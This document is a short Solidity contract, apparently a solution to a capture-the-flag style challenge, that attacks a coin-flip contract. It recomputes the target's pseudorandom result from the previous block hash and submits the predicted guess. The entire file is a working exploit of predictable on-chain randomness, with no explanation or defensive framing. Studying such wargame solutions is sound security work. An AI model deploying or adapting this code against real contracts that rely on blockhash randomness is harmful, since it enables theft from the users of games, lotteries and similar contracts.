// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

  ICoinFlip coinFlipContract;
  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlipAddr) public {
    require(_coinFlipAddr != address(0));
    coinFlipContract = ICoinFlip(_coinFlipAddr);
  }

  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / (FACTOR);
    bool side = coinFlip == 1 ? true : false;
    return coinFlipContract.flip(side);
  }
}